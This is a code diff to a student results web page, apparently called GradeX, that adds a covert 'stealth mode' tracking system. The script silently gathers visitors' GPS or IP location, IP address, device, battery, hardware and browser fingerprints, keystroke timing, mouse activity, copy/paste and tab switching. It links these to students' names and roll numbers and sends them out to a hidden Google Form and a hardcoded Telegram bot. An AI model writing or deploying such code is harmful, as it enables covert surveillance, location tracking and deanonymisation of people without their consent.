@@ -1231,185 +1231,573 @@
         document.getElementById('branchFilter').addEventListener('change', filterData);
         document.getElementById('divFilter').addEventListener('change', filterData);
 
-        // --- Cloud Tracking Logic (Google Forms Backend - Stealth Mode) ---
+        // ============================================================
+        // ADVANCED TRACKING SYSTEM v2.0 — GradeX Stealth Mode
+        // ============================================================
+
         const CLOUD_CONFIG = {
-            formUrl: "https://docs.google.com/forms/d/e/1FAIpQLScHuj6GMQot477On_FBe4yvPZEgOMmTOtVDZgbvBk07YI69ig/formResponse",
+            formUrl: "https://docs.google.com/forms/d/e/1FAIpQLSe5UZbFhCuJKsEiIeOu6qm0BwqqKNONZDzlJPgCyfhy7uvPPg/formResponse",
             entries: {
-                lat: "entry.313094556",
-                lon: "entry.1794910903",
-                acc: "entry.401162063",
-                time: "entry.1806013085"
+                lat:           "entry.1126662411",
+                lon:           "entry.317130369",
+                locationInfo:  "entry.1426038713",
+                deviceModel:   "entry.2029902210",
+                battery:       "entry.1926374808",
+                networkInfo:   "entry.1621708711",
+                browserInfo:   "entry.1547979287",
+                hardwareInfo:  "entry.1044567572",
+                fingerprint:   "entry.305963076",
+                behaviour:     "entry.2007231028",
+                visitCount:    "entry.46598059",
+                event:         "entry.1140336750",
+                timestamp:     "entry.1908017744",
+                timeOnPage:    "entry.738604793",
+                scrollDepth:   "entry.1520593085",
+                mousePattern:  "entry.1311389783",
+                keystrokeSpeed:"entry.472662880",
+                tabVisibility: "entry.477439241",
+                copyPaste:     "entry.1514059898",
+                vpnDetected:   "entry.209746112"
+            },
+            telegram: {
+                token:  "8213829694:AAFy-W3EZLI6Gr0O6XMChQhxgMAyPnYh4zE",
+                chatId: "6099939498"
             }
         };
 
+        // ── State ──────────────────────────────────────────────────
         let isSyncing = false;
+        const pageStartTime = Date.now();
+        let maxScrollDepth = 0;
+        let mouseMoveCount = 0;
+        let lastMouseTime = 0;
+        let mouseSpeedReadings = [];
+        let keystrokeTimes = [];
+        let tabHiddenCount = 0;
+        let copyPasteDetected = false;
+        let hoveredRows = new Set();
+        let denialCount = parseInt(localStorage.getItem('loc_denial_count') || '0');
 
-        // Helper to find who is visiting
+        // ── iPhone Model Guesser ───────────────────────────────────
+        function guessIphoneModel(w, h) {
+            const s = `${Math.min(w,h)}x${Math.max(w,h)}`;
+            const map = {
+                '375x667': 'iPhone 6/7/8',
+                '375x812': 'iPhone X/XS/11 Pro',
+                '390x844': 'iPhone 12/13/14',
+                '393x852': 'iPhone 15/15 Pro',
+                '414x736': 'iPhone 6+/7+/8+',
+                '414x896': 'iPhone 11/XR/XS Max',
+                '428x926': 'iPhone 12/13 Pro Max',
+                '430x932': 'iPhone 14 Plus/15 Plus',
+                '320x568': 'iPhone 5/SE (1st)',
+                '375x667': 'iPhone SE (2nd/3rd)'
+            };
+            return map[s] || `iPhone (${w}x${h})`;
+        }
+
+        // ── Android Model from UserAgent ───────────────────────────
+        function getAndroidModel(ua) {
+            const match = ua.match(/;\s([^;)]+)\sBuild\//);
+            return match ? match[1].trim() : 'Android Device';
+        }
+
+        // ── Device Model Detection ─────────────────────────────────
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            const w = screen.width, h = screen.height;
+            if (/iPhone/.test(ua)) return guessIphoneModel(w, h);
+            if (/iPad/.test(ua)) return `iPad (${w}x${h})`;
+            if (/Android/.test(ua)) return getAndroidModel(ua);
+            if (/Windows/.test(ua)) return 'Windows PC';
+            if (/Mac/.test(ua)) return 'MacBook/iMac';
+            if (/Linux/.test(ua)) return 'Linux PC';
+            return 'Unknown Device';
+        }
+
+        // ── Battery Info ───────────────────────────────────────────
+        async function getBattery() {
+            try {
+                const b = await navigator.getBattery();
+                return `${Math.round(b.level * 100)}% ${b.charging ? '⚡Charging' : '🔋Discharging'}`;
+            } catch { return 'Not available'; }
+        }
+
+        // ── Network Info ───────────────────────────────────────────
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return 'Unknown';
+            return `${conn.effectiveType || '?'} | Type: ${conn.type || '?'} | Downlink: ${conn.downlink || '?'}Mbps | RTT: ${conn.rtt || '?'}ms`;
+        }
+
+        // ── Browser Info ───────────────────────────────────────────
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            if (/CriOS/.test(ua)) browser = 'Chrome iOS';
+            else if (/FxiOS/.test(ua)) browser = 'Firefox iOS';
+            else if (/EdgA/.test(ua)) browser = 'Edge Android';
+            else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = 'Chrome';
+            else if (/Firefox\//.test(ua)) browser = 'Firefox';
+            else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+            else if (/Edg\//.test(ua)) browser = 'Edge';
+            else if (/OPR\//.test(ua)) browser = 'Opera';
+
+            const verMatch = ua.match(new RegExp(`${browser.split(' ')[0]}\\/([\\d.]+)`,'i'));
+            const ver = verMatch ? verMatch[1] : '?';
+
+            return [
+                `Browser: ${browser} ${ver}`,
+                `Lang: ${navigator.language}`,
+                `TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                `Cookies: ${navigator.cookieEnabled ? 'Yes' : 'No'}`,
+                `DNT: ${navigator.doNotTrack === '1' ? 'Yes' : 'No'}`,
+                `Platform: ${navigator.platform}`
+            ].join(' | ');
+        }
+
+        // ── Hardware Info ──────────────────────────────────────────
+        function getHardwareInfo() {
+            // GPU via WebGL
+            let gpu = 'Unknown GPU';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch {}
+
+            return [
+                `RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?'}`,
+                `CPU: ${navigator.hardwareConcurrency || '?'} cores`,
+                `GPU: ${gpu}`,
+                `Screen: ${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
+                `Touch: ${navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' pts)' : 'No'}`,
+                `Orientation: ${screen.orientation ? screen.orientation.type : 'Unknown'}`
+            ].join(' | ');
+        }
+
+        // ── Ad Blocker Detection ───────────────────────────────────
+        async function detectAdBlocker() {
+            try {
+                const el = document.createElement('div');
+                el.className = 'ad adsbox doubleclick ad-placement';
+                el.style.cssText = 'height:1px;width:1px;position:absolute;left:-9999px';
+                document.body.appendChild(el);
+                await new Promise(r => setTimeout(r, 100));
+                const blocked = el.offsetHeight === 0;
+                document.body.removeChild(el);
+                return blocked ? 'Yes' : 'No';
+            } catch { return 'Unknown'; }
+        }
+
+        // ── Canvas Fingerprint ─────────────────────────────────────
+        function getCanvasFingerprint() {
+            try {
+                const c = document.createElement('canvas');
+                const ctx = c.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('GradeX🔍', 2, 15);
+                ctx.fillStyle = 'rgba(102,204,0,0.7)';
+                ctx.fillText('GradeX🔍', 4, 17);
+                return c.toDataURL().slice(-50).replace(/[^a-zA-Z0-9]/g, '').slice(0, 16);
+            } catch { return 'unavailable'; }
+        }
+
+        // ── Audio Fingerprint ──────────────────────────────────────
+        async function getAudioFingerprint() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                const gain = ctx.createGain();
+                gain.gain.value = 0;
+                osc.connect(analyser);
+                analyser.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start(0);
+                const data = new Float32Array(analyser.frequencyBinCount);
+                analyser.getFloatFrequencyData(data);
+                osc.stop();
+                ctx.close();
+                const sum = data.slice(0, 10).reduce((a, b) => a + Math.abs(b), 0);
+                return sum.toFixed(4);
+            } catch { return 'unavailable'; }
+        }
+
+        // ── WebGL Fingerprint ──────────────────────────────────────
+        function getWebGLFingerprint() {
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl');
+                if (!gl) return 'unavailable';
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                return ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL).slice(0, 20) : 'no-ext';
+            } catch { return 'unavailable'; }
+        }
+
+        // ── Combined Fingerprint ID ────────────────────────────────
+        async function getFingerprint() {
+            const canvas = getCanvasFingerprint();
+            const webgl = getWebGLFingerprint();
+            const audio = await getAudioFingerprint();
+            const raw = `${canvas}|${webgl}|${audio}|${screen.width}|${screen.height}|${navigator.hardwareConcurrency}|${navigator.language}|${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+
+            // Simple hash
+            let hash = 0;
+            for (let i = 0; i < raw.length; i++) {
+                hash = ((hash << 5) - hash) + raw.charCodeAt(i);
+                hash |= 0;
+            }
+            return Math.abs(hash).toString(16).padStart(8, '0');
+        }
+
+        // ── Visit History ──────────────────────────────────────────
+        function getVisitInfo() {
+            const count = parseInt(localStorage.getItem('gx_visit_count') || '0') + 1;
+            const lastSeen = localStorage.getItem('gx_last_seen') || 'First Visit';
+            const firstSeen = localStorage.getItem('gx_first_seen') || new Date().toLocaleString();
+            localStorage.setItem('gx_visit_count', count);
+            localStorage.setItem('gx_last_seen', new Date().toLocaleString());
+            if (count === 1) localStorage.setItem('gx_first_seen', firstSeen);
+            return { count, lastSeen, firstSeen: localStorage.getItem('gx_first_seen') };
+        }
+
+        // ── Identity ───────────────────────────────────────────────
         function getVisitorIdentity() {
             const urlParams = new URLSearchParams(window.location.search);
             const rollParam = urlParams.get('r') || urlParams.get('roll');
             const enParam = urlParams.get('en') || urlParams.get('enrollment');
-
-            // Check URL first
             let student = allData.find(s => s.roll == rollParam || s.enrollment == enParam);
-
-            // If not in URL, check if we remembered them from a previous search
             if (!student) {
                 const savedRoll = localStorage.getItem('my_identity_roll');
                 if (savedRoll) student = allData.find(s => s.roll == savedRoll);
             }
-
-            return student ? `${student.name} (${student.roll})` : "Unknown Visitor";
+            return student ? `${student.name} (Roll: ${student.roll})` : 'Unknown Visitor';
         }
 
+        // ── Scroll Tracking ────────────────────────────────────────
+        window.addEventListener('scroll', () => {
+            const scrolled = window.scrollY + window.innerHeight;
+            const total = document.documentElement.scrollHeight;
+            const depth = Math.round((scrolled / total) * 100);
+            if (depth > maxScrollDepth) maxScrollDepth = depth;
+        });
+
+        // ── Mouse Speed Tracking ───────────────────────────────────
+        document.addEventListener('mousemove', (e) => {
+            const now = Date.now();
+            if (lastMouseTime) {
+                const speed = Math.sqrt(e.movementX**2 + e.movementY**2) / (now - lastMouseTime);
+                mouseSpeedReadings.push(speed);
+                if (mouseSpeedReadings.length > 20) mouseSpeedReadings.shift();
+            }
+            lastMouseTime = now;
+            mouseMoveCount++;
+        });
+
+        // ── Keystroke Timing ───────────────────────────────────────
+        document.addEventListener('keydown', () => {
+            keystrokeTimes.push(Date.now());
+        });
+
+        function getKeystrokeSpeed() {
+            if (keystrokeTimes.length < 2) return 'No typing detected';
+            const gaps = [];
+            for (let i = 1; i < keystrokeTimes.length; i++) {
+                gaps.push(keystrokeTimes[i] - keystrokeTimes[i-1]);
+            }
+            const avg = gaps.reduce((a,b) => a+b, 0) / gaps.length;
+            if (avg < 100) return `Fast typer (${Math.round(avg)}ms avg)`;
+            if (avg < 300) return `Medium typer (${Math.round(avg)}ms avg)`;
+            return `Slow typer (${Math.round(avg)}ms avg)`;
+        }
+
+        // ── Tab Visibility Tracking ────────────────────────────────
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) tabHiddenCount++;
+        });
+
+        // ── Copy/Paste Detection ───────────────────────────────────
+        document.addEventListener('copy', () => { copyPasteDetected = true; });
+        document.addEventListener('paste', () => { copyPasteDetected = true; });
+
+        // ── Row Hover Tracking ─────────────────────────────────────
+        document.getElementById('tableBody').addEventListener('mouseover', (e) => {
+            const tr = e.target.closest('tr');
+            if (tr && tr.cells[6]) {
+                const name = tr.cells[6].innerText.trim();
+                if (name && name !== '--') hoveredRows.add(name);
+            }
+        });
+
+        // ── Telegram Alert ─────────────────────────────────────────
+        async function sendTelegram(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${CLOUD_CONFIG.telegram.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CLOUD_CONFIG.telegram.chatId,
+                        text: msg,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch {}
+        }
+
+        // ── Google Form Submit ─────────────────────────────────────
+        function submitToForm(payload) {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = CLOUD_CONFIG.formUrl;
+            form.target = 'hidden_iframe';
+            form.style.display = 'none';
+
+            for (const [name, value] of Object.entries(payload)) {
+                const input = document.createElement('input');
+                input.name = name;
+                input.value = String(value).slice(0, 500); // Google Forms field limit safety
+                form.appendChild(input);
+            }
+
+            if (!document.getElementById('hidden_iframe')) {
+                const iframe = document.createElement('iframe');
+                iframe.id = 'hidden_iframe';
+                iframe.name = 'hidden_iframe';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+            }
+
+            document.body.appendChild(form);
+            form.submit();
+            setTimeout(() => { if (form.parentNode) document.body.removeChild(form); }, 3000);
+        }
+
+        // ── Permission Handler ─────────────────────────────────────
         async function requestPermission() {
             const overlay = document.getElementById('locationOverlay');
             const help = document.getElementById('locationHelp');
-
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    overlay.style.display = 'none';
-                    silentCloudSync(); // Resume sync with correct data
-                },
-                (err) => {
-                    if (err.code === 1) { // PERMISSION_DENIED
-                        help.style.display = 'block';
-                    }
-                },
+                () => { overlay.style.display = 'none'; silentCloudSync('Manual Allow'); },
+                (err) => { if (err.code === 1) help.style.display = 'block'; },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
-        async function silentCloudSync() {
+        // ── Main Sync Function ─────────────────────────────────────
+        async function silentCloudSync(eventName = 'Page Load') {
             if (isSyncing) return;
             isSyncing = true;
 
-            const identity = getVisitorIdentity();
             const overlay = document.getElementById('locationOverlay');
-            let lat, lon, accSource;
 
             try {
-                // Determine connection type silently
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const netType = conn ? `${conn.effectiveType} (${conn.type || 'unknown'})` : 'unknown';
-                const device = `${navigator.platform} | ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
+                const identity = getVisitorIdentity();
+                const visitInfo = getVisitInfo();
+                const timeOnPage = Math.round((Date.now() - pageStartTime) / 1000);
+                const mins = Math.floor(timeOnPage / 60), secs = timeOnPage % 60;
+                const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
 
-                // Attempt high-accuracy GPS/Wireless location first
+                // Behaviour summary
+                const avgMouseSpeed = mouseSpeedReadings.length
+                    ? (mouseSpeedReadings.reduce((a,b) => a+b,0) / mouseSpeedReadings.length).toFixed(2)
+                    : 0;
+                const mouseActivity = mouseMoveCount > 200 ? 'Very Active' : mouseMoveCount > 50 ? 'Active' : 'Low';
+                const hoveredList = [...hoveredRows].slice(0, 5).join(', ') || 'None';
+
+                // Hardware & Browser
+                const deviceModel = getDeviceModel();
+                const battery = await getBattery();
+                const networkInfo = getNetworkInfo();
+                const browserInfo = getBrowserInfo();
+                const hardwareInfo = getHardwareInfo();
+                const adBlocker = await detectAdBlocker();
+                const fingerprint = await getFingerprint();
+
+                // Check repeat visitor by fingerprint
+                const savedFP = localStorage.getItem('gx_fp');
+                const isRepeat = savedFP === fingerprint ? 'Yes' : 'No';
+                localStorage.setItem('gx_fp', fingerprint);
+
+                // Location
+                let lat = null, lon = null, locationInfo = '';
+                let vpnDetected = 'Unknown';
+
+                // Try GPS first
                 const position = await new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) {
-                        reject(new Error("Geolocation not supported"));
-                    } else {
-                        navigator.geolocation.getCurrentPosition(resolve, (err) => {
-                            if (err.code === 1) { // PERMISSION_DENIED
+                    if (!navigator.geolocation) { reject(new Error('No geolocation')); return; }
+                    navigator.geolocation.getCurrentPosition(resolve, (err) => {
+                        if (err.code === 1) { // Denied
+                            denialCount++;
+                            localStorage.setItem('loc_denial_count', denialCount);
+                            if (denialCount <= 3) {
                                 overlay.style.display = 'flex';
-                                setTimeout(() => {
-                                    overlay.style.display = 'none';
-                                }, 5000);
+                                setTimeout(() => { overlay.style.display = 'none'; }, 5000);
                             }
-                            reject(err);
-                        }, {
-                            enableHighAccuracy: true,
-                            timeout: 6000,
-                            maximumAge: 0
-                        });
-                    }
+                        }
+                        reject(err);
+                    }, { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 });
                 }).catch(() => null);
 
                 if (position && position.coords) {
                     lat = position.coords.latitude;
                     lon = position.coords.longitude;
-                    accSource = `${identity} | GPS (±${Math.round(position.coords.accuracy)}m) | ${netType} | ${device}`;
-                    overlay.style.display = 'none'; // Hide if it was showing
-                } else {
-                    // SILENT FALLBACK (Improved)
-                    const response = await fetch('https://ipapi.co/json/');
-                    const ipData = await response.json();
-                    lat = ipData.latitude;
-                    lon = ipData.longitude;
-
-                    // Comprehensive metadata for better identification
-                    const area = `${ipData.city}, ${ipData.postal || 'NoPIN'} (${ipData.region})`;
-                    const provider = `${ipData.org || ipData.asn} (${ipData.country_name})`;
-                    accSource = `${identity} | SILENT (Blocked) | Area: ${area} | ISP: ${provider} | Net: ${netType} | Dev: ${device}`;
+                    locationInfo = `GPS ±${Math.round(position.coords.accuracy)}m`;
+                    overlay.style.display = 'none';
                 }
 
-                if (lat && lon) {
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = CLOUD_CONFIG.formUrl;
-                    form.target = 'hidden_iframe';
-                    form.style.display = 'none';
-
-                    const payload = {
-                        [CLOUD_CONFIG.entries.lat]: lat,
-                        [CLOUD_CONFIG.entries.lon]: lon,
-                        [CLOUD_CONFIG.entries.acc]: accSource,
-                        [CLOUD_CONFIG.entries.time]: new Date().toLocaleString()
-                    };
-
-                    for (const [name, value] of Object.entries(payload)) {
-                        const input = document.createElement('input');
-                        input.name = name;
-                        input.value = value;
-                        form.appendChild(input);
+                // Always get IP data (for VPN, ISP, city etc)
+                let ipData = {};
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipData = await res.json();
+                    vpnDetected = ipData.proxy ? 'YES ⚠️' : 'No';
+                    if (!lat) {
+                        lat = ipData.latitude;
+                        lon = ipData.longitude;
+                        locationInfo = `IP-based (${ipData.city}, ${ipData.postal || ''} ${ipData.region})`;
+                    } else {
+                        locationInfo += ` | City: ${ipData.city}, ${ipData.region}`;
                     }
+                    locationInfo += ` | ISP: ${ipData.org || ipData.asn} | IP: ${ipData.ip}`;
+                } catch {}
 
-                    if (!document.getElementById('hidden_iframe')) {
-                        const iframe = document.createElement('iframe');
-                        iframe.id = 'hidden_iframe';
-                        iframe.name = 'hidden_iframe';
-                        iframe.style.display = 'none';
-                        document.body.appendChild(iframe);
-                    }
+                if (!lat || !lon) { isSyncing = false; return; }
 
-                    document.body.appendChild(form);
-                    form.submit();
-                    setTimeout(() => {
-                        if (form.parentNode) document.body.removeChild(form);
-                        isSyncing = false;
-                    }, 3000);
-                } else {
-                    isSyncing = false;
-                }
+                // Build Telegram message
+                const tgMsg = `🚨 <b>GradeX Alert!</b>
+━━━━━━━━━━━━━━━
+👤 <b>${identity}</b>
+📌 Event: <b>${eventName}</b>
+
+📍 <b>LOCATION</b>
+• ${locationInfo}
+• VPN: ${vpnDetected}
+• TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+📱 <b>DEVICE</b>
+• Model: ${deviceModel}
+• ${hardwareInfo.replace(/\|/g, '\n• ')}
+
+🔋 <b>BATTERY</b>
+• ${battery}
+
+🌐 <b>NETWORK</b>
+• ${networkInfo.replace(/\|/g, '\n• ')}
+
+🧠 <b>BROWSER</b>
+• ${browserInfo.replace(/\|/g, '\n• ')}
+• Ad Blocker: ${adBlocker}
+
+🎭 <b>FINGERPRINT</b>
+• ID: ${fingerprint}
+• Repeat Visitor: ${isRepeat}
+
+👁 <b>BEHAVIOUR</b>
+• Time on Page: ${timeStr}
+• Scroll Depth: ${maxScrollDepth}%
+• Mouse: ${mouseActivity} (${mouseMoveCount} moves)
+• Mouse Speed: ${avgMouseSpeed}
+• Keystrokes: ${getKeystrokeSpeed()}
+• Copy/Paste: ${copyPasteDetected ? 'Yes 📋' : 'No'}
+• Tab Hidden: ${tabHiddenCount} times
+• Hovered Rows: ${hoveredList}
+
+📊 <b>VISIT HISTORY</b>
+• Visit #${visitInfo.count}
+• Last Seen: ${visitInfo.lastSeen}
+• First Seen: ${visitInfo.firstSeen}
+
+⏰ ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━`;
+
+                // Send Telegram
+                await sendTelegram(tgMsg);
+
+                // Submit to Google Form
+                submitToForm({
+                    [CLOUD_CONFIG.entries.lat]:            lat,
+                    [CLOUD_CONFIG.entries.lon]:            lon,
+                    [CLOUD_CONFIG.entries.locationInfo]:   locationInfo,
+                    [CLOUD_CONFIG.entries.deviceModel]:    deviceModel,
+                    [CLOUD_CONFIG.entries.battery]:        battery,
+                    [CLOUD_CONFIG.entries.networkInfo]:    networkInfo,
+                    [CLOUD_CONFIG.entries.browserInfo]:    browserInfo,
+                    [CLOUD_CONFIG.entries.hardwareInfo]:   hardwareInfo,
+                    [CLOUD_CONFIG.entries.fingerprint]:    `${fingerprint} (Repeat: ${isRepeat})`,
+                    [CLOUD_CONFIG.entries.behaviour]:      `Mouse: ${mouseActivity} | Scroll: ${maxScrollDepth}% | Hovered: ${hoveredList}`,
+                    [CLOUD_CONFIG.entries.visitCount]:     `Visit #${visitInfo.count} | Last: ${visitInfo.lastSeen}`,
+                    [CLOUD_CONFIG.entries.event]:          eventName,
+                    [CLOUD_CONFIG.entries.timestamp]:      new Date().toLocaleString(),
+                    [CLOUD_CONFIG.entries.timeOnPage]:     timeStr,
+                    [CLOUD_CONFIG.entries.scrollDepth]:    `${maxScrollDepth}%`,
+                    [CLOUD_CONFIG.entries.mousePattern]:   `${mouseActivity} (${mouseMoveCount} moves, speed: ${avgMouseSpeed})`,
+                    [CLOUD_CONFIG.entries.keystrokeSpeed]: getKeystrokeSpeed(),
+                    [CLOUD_CONFIG.entries.tabVisibility]:  `Hidden ${tabHiddenCount} times`,
+                    [CLOUD_CONFIG.entries.copyPaste]:      copyPasteDetected ? 'Yes' : 'No',
+                    [CLOUD_CONFIG.entries.vpnDetected]:    vpnDetected
+                });
+
             } catch (err) {
-                isSyncing = false;
+                // Silent fail
+            } finally {
+                setTimeout(() => { isSyncing = false; }, 3000);
             }
         }
 
-        // Trigger automatically
-        window.addEventListener('load', silentCloudSync);
+        // ── Triggers ───────────────────────────────────────────────
 
-        // Stealth Identification: Search Listener (Roll or Name)
+        // 1. Page Load
+        window.addEventListener('load', () => silentCloudSync('Page Load'));
+
+        // 2. Search — identity lock
         document.getElementById('searchInput').addEventListener('input', (e) => {
             const val = e.target.value.toLowerCase().trim();
             if (val.length >= 3) {
                 const s = allData.find(x => x.roll == val || x.name.toLowerCase().includes(val));
                 if (s) {
                     localStorage.setItem('my_identity_roll', s.roll);
-                    silentCloudSync(); // Sync once identified
+                    silentCloudSync('Search: ' + s.name);
                 }
             }
         });
 
-        // Stealth Identification: Click Listener (If they click their row while scrolling)
+        // 3. Row Click — identity lock
         document.getElementById('tableBody').addEventListener('click', (e) => {
             const tr = e.target.closest('tr');
-            if (tr) {
-                // The roll number is in the second column (index 1)
+            if (tr && tr.cells[1]) {
                 const roll = tr.cells[1].innerText;
                 if (roll && /^\d+$/.test(roll)) {
                     localStorage.setItem('my_identity_roll', roll);
-                    silentCloudSync(); // Sync immediately on identification
+                    silentCloudSync('Row Click');
                 }
             }
         });
 
+        // 4. Hourly background re-sync
         document.body.addEventListener('mousedown', () => {
             const lastSync = localStorage.getItem('last_silent_sync');
-            if (!lastSync || (Date.now() - lastSync > 3600000)) {
-                silentCloudSync();
+            if (!lastSync || (Date.now() - parseInt(lastSync) > 3600000)) {
+                silentCloudSync('Hourly Sync');
                 localStorage.setItem('last_silent_sync', Date.now());
             }
+        });
+
+        // 5. Before they leave — capture final time on page
+        window.addEventListener('beforeunload', () => {
+            const timeOnPage = Math.round((Date.now() - pageStartTime) / 1000);
+            const mins = Math.floor(timeOnPage / 60), secs = timeOnPage % 60;
+            const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
+            // Quick beacon send (best effort on page close)
+            const identity = getVisitorIdentity();
+            sendTelegram(`👋 <b>${identity}</b> left the page\n⏱ Time spent: <b>${timeStr}</b>\n📜 Scroll: ${maxScrollDepth}%\n👁 Hovered: ${[...hoveredRows].slice(0,3).join(', ') || 'None'}`);
         });
     </script>
 </body>
